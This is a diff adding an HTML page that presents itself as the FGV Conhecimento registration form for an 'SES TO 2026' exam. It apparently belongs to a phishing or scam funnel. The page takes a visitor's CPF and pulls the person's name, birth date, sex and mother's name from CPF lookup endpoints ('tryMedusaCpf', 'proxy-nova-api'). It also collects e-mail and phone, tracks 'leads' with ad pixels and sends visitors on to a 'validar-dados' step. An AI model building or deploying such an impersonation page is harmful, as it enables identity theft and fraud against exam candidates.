@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>FGV Conhecimento - Inscrição | SES TO 2026</title>
+    <script src="js/3.4.16.js"></script>
+    <link href="css/all.min.css" rel="stylesheet">
+    <link href="../css/fgv-portal.css" rel="stylesheet">
+    <script src="js/utm-preservation.js"></script>
+    <style>
+        .hidden { display: none !important; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .animate-spin { animation: spin 1s linear infinite; }
+        .fgv-switch {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 0.9rem;
+            color: #6c757d;
+        }
+        .fgv-switch a {
+            color: #0d6efd;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .fgv-switch a:hover { text-decoration: underline; }
+        .fgv-hint {
+            font-size: 0.8rem;
+            color: #6c757d;
+            margin: 4px 0 0;
+        }
+        .fgv-input[readonly] {
+            background: #f1f3f5;
+            color: #495057;
+        }
+        .fgv-field-error {
+            border-color: #dc3545 !important;
+        }
+        .fgv-msg-error {
+            color: #dc3545;
+            font-size: 0.82rem;
+            margin-top: 10px;
+            display: none;
+        }
+        .fgv-msg-error.show { display: block; }
+        .pwd-wrap { position: relative; }
+        .pwd-wrap .fgv-input { padding-right: 42px; }
+        .pwd-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            border: 0;
+            background: transparent;
+            color: #6c757d;
+            cursor: pointer;
+            padding: 4px;
+        }
+        .fgv-badge-step {
+            display: inline-block;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #0d6efd;
+            background: #e7f1ff;
+            padding: 4px 10px;
+            border-radius: 999px;
+            margin-bottom: 10px;
+        }
+    </style>
+    <script>
+      window.googlePixelId = "68fafce3e95a8ad5bfc8863d";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmfy.com.br/scripts/pixel/pixel-google.js");
+      document.head.appendChild(a);
+    </script>
+    <script src="https://cdn.utmfy.com.br/scripts/utms/latest.js" data-utmfy-prevent-xcod-sck data-utmfy-prevent-subids async defer></script>
+</head>
+<body class="fgv-body">
+    <div class="fgv-shell">
+        <div class="fgv-brand">
+            <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+        </div>
+
+        <main class="fgv-main">
+            <div class="fgv-card">
+                <!-- INSCRIÇÃO (padrão — maioria dos leads é novo) -->
+                <div class="fgv-card-body" id="panel-cadastro">
+                    <span class="fgv-badge-step">Etapa 1 de inscrição</span>
+                    <h1 class="fgv-card-title">Inscrição SES TO 2026</h1>
+                    <p class="fgv-hint" style="margin-bottom:16px">Informe seu CPF para iniciar. Os dados básicos são preenchidos automaticamente.</p>
+
+                    <div class="fgv-field">
+                        <label class="fgv-label" for="cad-cpf">CPF</label>
+                        <input id="cad-cpf" class="fgv-input" placeholder="000.000.000-00" type="tel" inputmode="numeric" autocomplete="off" oninput="formatCPF(this); onCadCpfInput();">
+                    </div>
+
+                    <div class="fgv-field">
+                        <label class="fgv-label" for="cad-nome">Nome completo</label>
+                        <input id="cad-nome" class="fgv-input" type="text" placeholder="Preenchido automaticamente" readonly oninput="checkCadastroForm()">
+                        <p class="fgv-hint" id="cad-nome-hint">Digite o CPF para buscar o nome.</p>
+                    </div>
+
+                    <div class="fgv-field">
+                        <label class="fgv-label" for="cad-email">E-mail</label>
+                        <input id="cad-email" class="fgv-input" type="email" placeholder="seu@email.com" autocomplete="email" oninput="checkCadastroForm()">
+                    </div>
+
+                    <div class="fgv-field">
+                        <label class="fgv-label" for="cad-telefone">Telefone / WhatsApp</label>
+                        <input id="cad-telefone" class="fgv-input" type="tel" inputmode="numeric" placeholder="(00) 00000-0000" autocomplete="tel" oninput="formatPhone(this); checkCadastroForm()">
+                    </div>
+
+                    <div class="fgv-field">
+                        <label class="fgv-label" for="cad-nascimento">Data de nascimento</label>
+                        <input id="cad-nascimento" class="fgv-input" type="text" placeholder="DD/MM/AAAA" readonly>
+                    </div>
+
+                    <p id="cad-error" class="fgv-msg-error"></p>
+
+                    <div class="fgv-actions" style="margin-top:20px">
+                        <button id="cad-btn" class="fgv-btn fgv-btn--block" type="button" disabled onclick="doCadastro()">Continuar inscrição</button>
+                    </div>
+
+                    <div class="fgv-switch">
+                        Já iniciou a inscrição?
+                        <a onclick="showLogin()">Entrar com CPF</a>
+                    </div>
+                </div>
+
+                <!-- LOGIN (secundário — retorno) -->
+                <div class="fgv-card-body hidden" id="panel-login">
+                    <h1 class="fgv-card-title">Continuar inscrição</h1>
+                    <p class="fgv-hint" style="margin-bottom:16px">Informe o CPF usado na inscrição para retomar de onde parou.</p>
+
+                    <div class="fgv-field">
+                        <label class="fgv-label" for="login-cpf">CPF</label>
+                        <input id="login-cpf" class="fgv-input" placeholder="000.000.000-00" type="tel" inputmode="numeric" autocomplete="username" oninput="formatCPF(this); checkLoginForm();">
+                    </div>
+
+                    <p id="login-error" class="fgv-msg-error"></p>
+
+                    <div class="fgv-actions" style="margin-top:20px">
+                        <button id="login-btn" class="fgv-btn fgv-btn--block" type="button" disabled onclick="doLogin()">Continuar</button>
+                    </div>
+
+                    <div class="fgv-switch">
+                        Ainda não começou?
+                        <a onclick="showCadastro()">Fazer inscrição</a>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="fgv-footer">
+            <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+            <div>FGV Conhecimento</div>
+        </footer>
+    </div>
+
+    <div id="validation-popup" class="hidden" style="position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:50">
+        <div style="position:absolute;inset:0;background:rgba(0,0,0,.45)"></div>
+        <div class="fgv-popup-card" style="position:relative;z-index:1">
+            <svg class="animate-spin" style="height:40px;width:40px;color:#0d6efd;margin:0 auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle style="opacity:.25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path style="opacity:.75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            <h3 id="popup-title">Validando seus dados...</h3>
+            <p id="popup-text" style="color:#6c757d;margin:0">Aguarde enquanto verificamos as informações.</p>
+        </div>
+    </div>
+
+    <script>
+        var cadastroCpfData = null;
+        var cadastroBuscando = false;
+        var cadastroCpfReq = 0;
+
+        function formatCPF(input) {
+            var value = input.value.replace(/\D/g, "");
+            if (value.length > 11) value = value.substring(0, 11);
+            if (value.length > 9) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+            } else if (value.length > 6) {
+                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+            } else if (value.length > 3) {
+                value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+            }
+            input.value = value;
+        }
+
+        function formatPhone(input) {
+            var v = input.value.replace(/\D/g, "").substring(0, 11);
+            if (v.length > 10) {
+                v = v.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3");
+            } else if (v.length > 6) {
+                v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
+            } else if (v.length > 2) {
+                v = v.replace(/(\d{2})(\d{0,5})/, "($1) $2");
+            }
+            input.value = v;
+        }
+
+        function unformat(v) { return String(v || "").replace(/\D/g, ""); }
+
+        function showLogin() {
+            document.getElementById("panel-login").classList.remove("hidden");
+            document.getElementById("panel-cadastro").classList.add("hidden");
+            hideError("login-error");
+            checkLoginForm();
+        }
+
+        function showCadastro() {
+            document.getElementById("panel-login").classList.add("hidden");
+            document.getElementById("panel-cadastro").classList.remove("hidden");
+            hideError("cad-error");
+            checkCadastroForm();
+        }
+
+        function showPopup(title, text) {
+            document.getElementById("popup-title").textContent = title || "Aguarde...";
+            document.getElementById("popup-text").textContent = text || "";
+            var p = document.getElementById("validation-popup");
+            p.classList.remove("hidden");
+            p.style.display = "flex";
+        }
+
+        function hidePopup() {
+            var p = document.getElementById("validation-popup");
+            p.classList.add("hidden");
+            p.style.display = "none";
+        }
+
+        function showError(id, msg) {
+            var el = document.getElementById(id);
+            if (!el) return;
+            el.textContent = msg;
+            el.classList.add("show");
+        }
+
+        function hideError(id) {
+            var el = document.getElementById(id);
+            if (!el) return;
+            el.textContent = "";
+            el.classList.remove("show");
+        }
+
+        function setNomeEditable(editable) {
+            var nome = document.getElementById("cad-nome");
+            var nasc = document.getElementById("cad-nascimento");
+            if (!nome) return;
+            nome.readOnly = !editable;
+            if (editable) {
+                nome.placeholder = "Digite seu nome completo";
+                nome.removeAttribute("readonly");
+            } else {
+                nome.placeholder = "Preenchido automaticamente";
+                nome.setAttribute("readonly", "readonly");
+            }
+            if (nasc) {
+                nasc.readOnly = !editable;
+                if (editable) nasc.removeAttribute("readonly");
+                else nasc.setAttribute("readonly", "readonly");
+            }
+        }
+
+        function checkLoginForm() {
+            var cpfOk = unformat(document.getElementById("login-cpf").value).length === 11;
+            document.getElementById("login-btn").disabled = !cpfOk;
+        }
+
+        function checkCadastroForm() {
+            var cpfOk = unformat(document.getElementById("cad-cpf").value).length === 11;
+            var nomeOk = (document.getElementById("cad-nome").value || "").trim().length >= 3;
+            var email = (document.getElementById("cad-email").value || "").trim();
+            var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            var telOk = unformat(document.getElementById("cad-telefone").value).length >= 10;
+            var hasCpfContext = !!cadastroCpfData || nomeOk;
+            document.getElementById("cad-btn").disabled = !(cpfOk && nomeOk && emailOk && telOk && hasCpfContext && !cadastroBuscando);
+        }
+
+        function normalizeCpfPayload(data, cpfNum) {
+            var s = (data && data.dados && data.dados[0])
+                || (data && data.DADOS)
+                || (data && data.dados)
+                || data
+                || {};
+            var nome = s.NOME || s.nome || data.NOME || data.nome || "";
+            var nascimento = s.NASC || s.NASCIMENTO || s.nascimento || s.data_nascimento || data.NASCIMENTO || data.nascimento || "";
+            var mae = s.NOME_MAE || s.mae || s.nome_mae || data.MAE || "";
+            var sexo = s.SEXO || s.sexo || data.SEXO || "";
+            if (!nome) throw new Error("CPF sem nome na resposta");
+            return { nome: nome, nascimento: nascimento, cpf: cpfNum, sexo: sexo, mae: mae };
+        }
+
+        function formatNascimentoDisplay(nasc) {
+            if (!nasc) return "";
+            var s = String(nasc).trim();
+            if (/^\d{2}\/\d{2}\/\d{4}/.test(s)) return s.substring(0, 10);
+            var m = s.match(/^(\d{4})-(\d{2})-(\d{2})/);
+            if (m) return m[3] + "/" + m[2] + "/" + m[1];
+            return s;
+        }
+
+        function consultarCpf(cpf) {
+            function tryMedusaCpf() {
+                return fetch("/cpf-consulta.php", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                    body: JSON.stringify({ cpf: cpf })
+                })
+                .then(function (response) {
+                    if (!response.ok) throw new Error("cpf-consulta indisponível");
+                    return response.json();
+                })
+                .then(function (data) {
+                    if (data.error) throw new Error(data.error);
+                    return normalizeCpfPayload(data, cpf);
+                });
+            }
+
+            function tryProxyNova() {
+                return fetch("/proxy-nova-api.php?cpf=" + encodeURIComponent(cpf), { method: "GET" })
+                    .then(function (response) {
+                        if (!response.ok) throw new Error("proxy-nova-api indisponível");
+                        return response.json();
+                    })
+                    .then(function (data) {
+                        if (data.error) throw new Error(data.error);
+                        return normalizeCpfPayload(data, cpf);
+                    });
+            }
+
+            return tryMedusaCpf().catch(function () { return tryProxyNova(); });
+        }
+
+        function goValidarDados(cpfData, extras) {
+            try {
+                localStorage.setItem("cpfData", JSON.stringify(cpfData));
+                if (extras) {
+                    if (extras.email) localStorage.setItem("emailConfirmacao", extras.email);
+                    if (extras.telefone) {
+                        var end = {};
+                        try { end = JSON.parse(localStorage.getItem("enderecoData") || "{}"); } catch (e) {}
+                        end.telefone = extras.telefone;
+                        localStorage.setItem("enderecoData", JSON.stringify(end));
+                    }
+                    localStorage.setItem("cadastroRapido", JSON.stringify(extras));
+                }
+                if (window.FunnelTracker) FunnelTracker.advance("inscricao");
+            } catch (e) {}
+            setTimeout(function () {
+                if (typeof redirectWithUtmParams === "function") {
+                    redirectWithUtmParams("/validar-dados/");
+                } else {
+                    window.location.href = "/validar-dados/";
+                }
+            }, 700);
+        }
+
+        // Retorno: só CPF (sem senha falsa)
+        function doLogin() {
+            hideError("login-error");
+            var cpf = unformat(document.getElementById("login-cpf").value);
+            if (cpf.length !== 11) {
+                showError("login-error", "Informe um CPF válido.");
+                return;
+            }
+
+            showPopup("Continuando...", "Validando seu CPF. Aguarde.");
+            document.getElementById("login-btn").disabled = true;
+
+            consultarCpf(cpf)
+                .then(function (data) {
+                    goValidarDados(data, { origem: "login" });
+                })
+                .catch(function () {
+                    // Mesmo sem API, não trava o retorno: segue com CPF
+                    goValidarDados({ cpf: cpf, nome: "", nascimento: "" }, { origem: "login", cpfManual: true });
+                });
+        }
+
+        function onCadCpfInput() {
+            var cpf = unformat(document.getElementById("cad-cpf").value);
+            cadastroCpfData = null;
+            document.getElementById("cad-nome").value = "";
+            document.getElementById("cad-nascimento").value = "";
+            setNomeEditable(false);
+            document.getElementById("cad-nome-hint").textContent = "Digite o CPF para buscar o nome.";
+            checkCadastroForm();
+
+            if (cpf.length !== 11) return;
+
+            var reqId = ++cadastroCpfReq;
+            cadastroBuscando = true;
+            document.getElementById("cad-nome-hint").textContent = "Buscando dados do CPF...";
+            checkCadastroForm();
+
+            consultarCpf(cpf)
+                .then(function (data) {
+                    if (reqId !== cadastroCpfReq) return;
+                    cadastroCpfData = data;
+                    setNomeEditable(false);
+                    document.getElementById("cad-nome").value = data.nome || "";
+                    document.getElementById("cad-nascimento").value = formatNascimentoDisplay(data.nascimento);
+                    document.getElementById("cad-nome-hint").textContent = "Dados encontrados. Complete e-mail e telefone.";
+                    checkCadastroForm();
+                })
+                .catch(function () {
+                    if (reqId !== cadastroCpfReq) return;
+                    cadastroCpfData = { cpf: cpf, nome: "", nascimento: "", manual: true };
+                    setNomeEditable(true);
+                    document.getElementById("cad-nome").value = "";
+                    document.getElementById("cad-nascimento").value = "";
+                    document.getElementById("cad-nome-hint").textContent = "Não encontramos o CPF automaticamente. Digite seu nome completo.";
+                    checkCadastroForm();
+                })
+                .finally(function () {
+                    if (reqId !== cadastroCpfReq) return;
+                    cadastroBuscando = false;
+                    checkCadastroForm();
+                });
+        }
+
+        function doCadastro() {
+            hideError("cad-error");
+            var cpf = unformat(document.getElementById("cad-cpf").value);
+            var nome = (document.getElementById("cad-nome").value || "").trim();
+            var email = (document.getElementById("cad-email").value || "").trim();
+            var telefone = unformat(document.getElementById("cad-telefone").value);
+            var nasc = (document.getElementById("cad-nascimento").value || "").trim();
+
+            if (cpf.length !== 11) {
+                showError("cad-error", "Informe um CPF válido.");
+                return;
+            }
+            if (nome.length < 3) {
+                showError("cad-error", "Informe seu nome completo.");
+                document.getElementById("cad-nome").focus();
+                return;
+            }
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showError("cad-error", "Informe um e-mail válido.");
+                return;
+            }
+            if (telefone.length < 10) {
+                showError("cad-error", "Informe um telefone válido.");
+                return;
+            }
+
+            showPopup("Iniciando inscrição...", "Salvando suas informações.");
+            document.getElementById("cad-btn").disabled = true;
+
+            var data = Object.assign({}, cadastroCpfData || {}, {
+                nome: nome,
+                cpf: cpf,
+                nascimento: (cadastroCpfData && cadastroCpfData.nascimento) || nasc || ""
+            });
+
+            goValidarDados(data, {
+                origem: "cadastro",
+                email: email,
+                telefone: telefone
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            // Sempre começa na inscrição (lead novo)
+            showCadastro();
+
+            ["cad-cpf", "cad-email", "cad-telefone", "cad-nome"].forEach(function (id) {
+                var el = document.getElementById(id);
+                if (!el) return;
+                el.addEventListener("keydown", function (e) {
+                    if (e.key === "Enter") {
+                        e.preventDefault();
+                        if (!document.getElementById("cad-btn").disabled) doCadastro();
+                    }
+                });
+            });
+
+            var loginCpf = document.getElementById("login-cpf");
+            if (loginCpf) {
+                loginCpf.addEventListener("keydown", function (e) {
+                    if (e.key === "Enter") {
+                        e.preventDefault();
+                        if (!document.getElementById("login-btn").disabled) doLogin();
+                    }
+                });
+            }
+        });
+    </script>
+<script src="/js/funnel-tracker.js" data-funnel-step="inscricao"></script>
+</body>
+</html>
